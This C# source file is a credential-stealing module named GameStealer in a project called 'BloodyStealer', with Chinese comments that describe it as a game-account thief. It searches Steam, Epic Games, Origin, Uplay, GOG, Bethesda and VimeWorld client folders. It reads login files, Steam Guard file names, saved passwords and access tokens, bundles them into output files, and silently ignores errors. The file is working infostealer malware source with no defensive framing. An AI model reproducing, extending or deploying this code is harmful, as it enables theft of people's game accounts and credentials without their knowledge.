using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace BloodyStealer
{
    /// <summary>
    /// 游戏账号窃取器 - 从各种游戏客户端窃取账号和存储数据
    /// </summary>
    internal static class GameStealer
    {
        #region 统计计数器

        /// <summary>
        /// Steam账号数量
        /// </summary>
        public static int SteamCount { get; private set; } = 0;

        /// <summary>
        /// Epic Games账号数量
        /// </summary>
        public static int EpicGamesCount { get; private set; } = 0;

        /// <summary>
        /// Origin账号数量
        /// </summary>
        public static int OriginCount { get; private set; } = 0;

        /// <summary>
        /// Uplay账号数量
        /// </summary>
        public static int UplayCount { get; private set; } = 0;

        /// <summary>
        /// GOG账号数量
        /// </summary>
        public static int GOGCount { get; private set; } = 0;

        /// <summary>
        /// Bethesda账号数量
        /// </summary>
        public static int BethesdaCount { get; private set; } = 0;

        /// <summary>
        /// VimeWorld账号数量
        /// </summary>
        public static int VimeWorldCount { get; private set; } = 0;

        #endregion

        /// <summary>
        /// 收集所有游戏客户端数据
        /// </summary>
        /// <returns>窃取的游戏数据文件列表</returns>
        public static List<FileObject> CollectAllGameData()
        {
            List<FileObject> gameData = new List<FileObject>();

            // 收集Steam数据
            try
            {
                FileObject steamData = GetSteamData();
                if (steamData != null)
                {
                    gameData.Add(steamData);
                }
            }
            catch { /* 忽略错误 */ }

            // 收集Epic Games数据
            try
            {
                FileObject epicData = GetEpicGamesData();
                if (epicData != null)
                {
                    gameData.Add(epicData);
                }
            }
            catch { /* 忽略错误 */ }

            // 收集Origin数据
            try
            {
                FileObject originData = GetOriginData();
                if (originData != null)
                {
                    gameData.Add(originData);
                }
            }
            catch { /* 忽略错误 */ }

            // 收集Uplay数据
            try
            {
                FileObject uplayData = GetUplayData();
                if (uplayData != null)
                {
                    gameData.Add(uplayData);
                }
            }
            catch { /* 忽略错误 */ }

            // 收集GOG数据
            try
            {
                FileObject gogData = GetGOGData();
                if (gogData != null)
                {
                    gameData.Add(gogData);
                }
            }
            catch { /* 忽略错误 */ }

            // 收集Bethesda数据
            try
            {
                FileObject bethesdaData = GetBethesdaData();
                if (bethesdaData != null)
                {
                    gameData.Add(bethesdaData);
                }
            }
            catch { /* 忽略错误 */ }

            // 收集VimeWorld数据
            try
            {
                FileObject vimeWorldData = GetVimeWorldData();
                if (vimeWorldData != null)
                {
                    gameData.Add(vimeWorldData);
                }
            }
            catch { /* 忽略错误 */ }

            return gameData;
        }

        /// <summary>
        /// 获取Steam客户端数据
        /// 原始代码: Steam.cs
        /// </summary>
        /// <returns>包含Steam数据的文件对象</returns>
        private static FileObject GetSteamData()
        {
            StringBuilder result = new StringBuilder();

            // Steam安装目录
            string steamPath = GetSteamPath();
            if (string.IsNullOrEmpty(steamPath))
            {
                return null;
            }

            result.AppendLine("=== Steam账号信息 ===");
            result.AppendLine($"Steam安装路径: {steamPath}");
            result.AppendLine();

            // 收集配置文件（其中包含用户名等信息）
            string configFile = Path.Combine(steamPath, "config", "config.vdf");
            if (File.Exists(configFile))
            {
                result.AppendLine("配置文件内容:");
                result.AppendLine(File.ReadAllText(configFile));
                result.AppendLine();
            }

            // 收集登录信息
            string loginUsersFile = Path.Combine(steamPath, "config", "loginusers.vdf");
            if (File.Exists(loginUsersFile))
            {
                result.AppendLine("登录用户信息:");
                string content = File.ReadAllText(loginUsersFile);
                result.AppendLine(content);

                // 提取账号数量
                MatchCollection matches = Regex.Matches(content, "\"AccountName\"\\s+\"([^\"]+)\"");
                SteamCount = matches.Count;
                
                result.AppendLine($"找到 {SteamCount} 个Steam账号");
                result.AppendLine();
            }

            // 收集Steam ID映射
            string localConfigFile = Path.Combine(steamPath, "config", "localconfig.vdf");
            if (File.Exists(localConfigFile))
            {
                result.AppendLine("本地配置文件内容:");
                result.AppendLine(File.ReadAllText(localConfigFile));
                result.AppendLine();
            }

            // ssfn文件（Steam Guard认证文件）
            string[] ssfnFiles = Directory.GetFiles(steamPath, "ssfn*");
            if (ssfnFiles.Length > 0)
            {
                result.AppendLine("发现Steam Guard认证文件:");
                foreach (string ssfnFile in ssfnFiles)
                {
                    result.AppendLine(Path.GetFileName(ssfnFile));
                }
                result.AppendLine();
            }

            return new FileObject("Games/Steam.txt", result.ToString());
        }

        /// <summary>
        /// 获取Epic Games客户端数据
        /// 原始代码: EpicGames.cs
        /// </summary>
        /// <returns>包含Epic Games数据的文件对象</returns>
        private static FileObject GetEpicGamesData()
        {
            StringBuilder result = new StringBuilder();

            // Epic Games配置目录
            string epicConfigPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "EpicGamesLauncher", "Saved", "Config");

            if (!Directory.Exists(epicConfigPath))
            {
                return null;
            }

            result.AppendLine("=== Epic Games账号信息 ===");
            result.AppendLine($"配置路径: {epicConfigPath}");
            result.AppendLine();

            // 获取认证缓存
            string configFile = Path.Combine(epicConfigPath, "Windows", "GameUserSettings.ini");
            if (File.Exists(configFile))
            {
                string content = File.ReadAllText(configFile);
                result.AppendLine("用户设置文件内容:");
                result.AppendLine(content);
                result.AppendLine();
                
                if (content.Contains("RememberMe=true") || content.Contains("[Auth]"))
                {
                    EpicGamesCount++;
                }
            }

            // 获取Web缓存（可能包含认证令牌）
            string webCachePath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "EpicGamesLauncher", "Saved", "webcache");

            if (Directory.Exists(webCachePath))
            {
                result.AppendLine("Web缓存目录:");
                result.AppendLine(webCachePath);
                result.AppendLine();
            }

            return new FileObject("Games/EpicGames.txt", result.ToString());
        }

        /// <summary>
        /// 获取Origin客户端数据
        /// 原始代码: Origin.cs
        /// </summary>
        /// <returns>包含Origin数据的文件对象</returns>
        private static FileObject GetOriginData()
        {
            StringBuilder result = new StringBuilder();

            // Origin配置目录
            string originConfigPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Origin");

            if (!Directory.Exists(originConfigPath))
            {
                return null;
            }

            result.AppendLine("=== Origin账号信息 ===");
            result.AppendLine($"配置路径: {originConfigPath}");
            result.AppendLine();

            // 获取本地配置文件
            string localConfigFile = Path.Combine(originConfigPath, "local.xml");
            if (File.Exists(localConfigFile))
            {
                string content = File.ReadAllText(localConfigFile);
                result.AppendLine("本地配置文件内容:");
                result.AppendLine(content);
                result.AppendLine();
                
                // 提取用户信息
                if (content.Contains("<userId>"))
                {
                    OriginCount++;
                }
            }

            // 获取用户配置
            string usersConfigFile = Path.Combine(originConfigPath, "Users", "OFB-EAST", "Origin_SSO_Client.ini");
            if (File.Exists(usersConfigFile))
            {
                result.AppendLine("用户配置文件内容:");
                result.AppendLine(File.ReadAllText(usersConfigFile));
                result.AppendLine();
            }

            return new FileObject("Games/Origin.txt", result.ToString());
        }

        /// <summary>
        /// 获取Uplay客户端数据
        /// 原始代码未直接实现
        /// </summary>
        /// <returns>包含Uplay数据的文件对象</returns>
        private static FileObject GetUplayData()
        {
            StringBuilder result = new StringBuilder();

            // Uplay配置目录
            string uplayConfigPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Ubisoft Game Launcher");

            if (!Directory.Exists(uplayConfigPath))
            {
                return null;
            }

            result.AppendLine("=== Uplay账号信息 ===");
            result.AppendLine($"配置路径: {uplayConfigPath}");
            result.AppendLine();

            // 获取用户配置
            string[] configFiles = Directory.GetFiles(uplayConfigPath, "*.xml", SearchOption.AllDirectories);
            foreach (string configFile in configFiles)
            {
                if (configFile.Contains("settings") || configFile.Contains("user") || configFile.Contains("cache"))
                {
                    result.AppendLine($"配置文件: {Path.GetFileName(configFile)}");
                    result.AppendLine(File.ReadAllText(configFile));
                    result.AppendLine();
                    
                    if (File.ReadAllText(configFile).Contains("<account>") || 
                        File.ReadAllText(configFile).Contains("email") || 
                        File.ReadAllText(configFile).Contains("password"))
                    {
                        UplayCount++;
                    }
                }
            }

            return new FileObject("Games/Uplay.txt", result.ToString());
        }

        /// <summary>
        /// 获取GOG客户端数据
        /// 原始代码: GOG.cs
        /// </summary>
        /// <returns>包含GOG数据的文件对象</returns>
        private static FileObject GetGOGData()
        {
            StringBuilder result = new StringBuilder();

            // GOG配置目录
            string gogConfigPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "GOG.com", "Galaxy", "storage");

            if (!Directory.Exists(gogConfigPath))
            {
                return null;
            }

            result.AppendLine("=== GOG Galaxy账号信息 ===");
            result.AppendLine($"配置路径: {gogConfigPath}");
            result.AppendLine();

            // 获取存储的配置和缓存
            string[] galaxyFiles = Directory.GetFiles(gogConfigPath, "*.json", SearchOption.AllDirectories);
            foreach (string galaxyFile in galaxyFiles)
            {
                if (galaxyFile.Contains("galaxy-client") || galaxyFile.Contains("user.json") || galaxyFile.Contains("login"))
                {
                    result.AppendLine($"文件: {Path.GetFileName(galaxyFile)}");
                    result.AppendLine(File.ReadAllText(galaxyFile));
                    result.AppendLine();
                    
                    if (File.ReadAllText(galaxyFile).Contains("access_token") || 
                        File.ReadAllText(galaxyFile).Contains("refresh_token") || 
                        File.ReadAllText(galaxyFile).Contains("username"))
                    {
                        GOGCount++;
                    }
                }
            }

            // 获取数据库（可能包含认证信息）
            string[] dbFiles = Directory.GetFiles(gogConfigPath, "*.db", SearchOption.AllDirectories);
            if (dbFiles.Length > 0)
            {
                result.AppendLine("发现数据库文件:");
                foreach (string dbFile in dbFiles)
                {
                    result.AppendLine(Path.GetFileName(dbFile));
                }
                result.AppendLine();
            }

            return new FileObject("Games/GOG.txt", result.ToString());
        }

        /// <summary>
        /// 获取Bethesda启动器数据
        /// 原始代码: Bethesda.cs
        /// </summary>
        /// <returns>包含Bethesda数据的文件对象</returns>
        private static FileObject GetBethesdaData()
        {
            StringBuilder result = new StringBuilder();

            // Bethesda配置目录
            string bethesdaConfigPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Bethesda.net Launcher");

            if (!Directory.Exists(bethesdaConfigPath))
            {
                return null;
            }

            result.AppendLine("=== Bethesda启动器账号信息 ===");
            result.AppendLine($"配置路径: {bethesdaConfigPath}");
            result.AppendLine();

            // 获取配置文件
            string[] configFiles = Directory.GetFiles(bethesdaConfigPath, "*.xml", SearchOption.AllDirectories);
            foreach (string configFile in configFiles)
            {
                result.AppendLine($"配置文件: {Path.GetFileName(configFile)}");
                result.AppendLine(File.ReadAllText(configFile));
                result.AppendLine();
                
                if (File.ReadAllText(configFile).Contains("<account>") || 
                    File.ReadAllText(configFile).Contains("username") || 
                    File.ReadAllText(configFile).Contains("password"))
                {
                    BethesdaCount++;
                }
            }

            // 获取用户数据
            string userDataPath = Path.Combine(bethesdaConfigPath, "userData");
            if (Directory.Exists(userDataPath))
            {
                string[] userFiles = Directory.GetFiles(userDataPath, "*.*", SearchOption.AllDirectories);
                foreach (string userFile in userFiles)
                {
                    if (userFile.EndsWith(".json") || userFile.EndsWith(".ini"))
                    {
                        result.AppendLine($"用户文件: {Path.GetFileName(userFile)}");
                        result.AppendLine(File.ReadAllText(userFile));
                        result.AppendLine();
                    }
                }
            }

            return new FileObject("Games/Bethesda.txt", result.ToString());
        }

        /// <summary>
        /// 获取VimeWorld客户端数据
        /// 原始代码: VimeWorld.cs
        /// </summary>
        /// <returns>包含VimeWorld数据的文件对象</returns>
        private static FileObject GetVimeWorldData()
        {
            StringBuilder result = new StringBuilder();

            // VimeWorld配置目录
            string vimeWorldConfigPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                ".vimeworld");

            if (!Directory.Exists(vimeWorldConfigPath))
            {
                return null;
            }

            result.AppendLine("=== VimeWorld账号信息 ===");
            result.AppendLine($"配置路径: {vimeWorldConfigPath}");
            result.AppendLine();

            // 获取配置文件
            string configFile = Path.Combine(vimeWorldConfigPath, "config.json");
            if (File.Exists(configFile))
            {
                string content = File.ReadAllText(configFile);
                result.AppendLine("配置文件内容:");
                result.AppendLine(content);
                result.AppendLine();
                
                if (content.Contains("username") || content.Contains("password") || content.Contains("accessToken"))
                {
                    VimeWorldCount++;
                }
            }

            // 获取用户配置文件
            string[] userFiles = Directory.GetFiles(vimeWorldConfigPath, "*.json");
            foreach (string userFile in userFiles)
            {
                if (userFile != configFile)
                {
                    result.AppendLine($"用户文件: {Path.GetFileName(userFile)}");
                    result.AppendLine(File.ReadAllText(userFile));
                    result.AppendLine();
                }
            }

            return new FileObject("Games/VimeWorld.txt", result.ToString());
        }

        #region 辅助方法

        /// <summary>
        /// 获取Steam安装路径
        /// </summary>
        /// <returns>Steam安装目录路径</returns>
        private static string GetSteamPath()
        {
            try
            {
                // 常见的Steam安装路径
                string[] possiblePaths = new string[]
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Steam"),
                    @"D:\Steam",
                    @"C:\Steam",
                };

                foreach (string path in possiblePaths)
                {
                    if (Directory.Exists(path) && File.Exists(Path.Combine(path, "steam.exe")))
                    {
                        return path;
                    }
                }

                // 尝试从注册表获取
                using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam"))
                {
                    if (key != null)
                    {
                        string path = key.GetValue("SteamPath") as string;
                        if (!string.IsNullOrEmpty(path) && Directory.Exists(path))
                        {
                            return path;
                        }
                    }
                }
            }
            catch
            {
                // 忽略错误
            }

            return string.Empty;
        }

        #endregion
    }
} 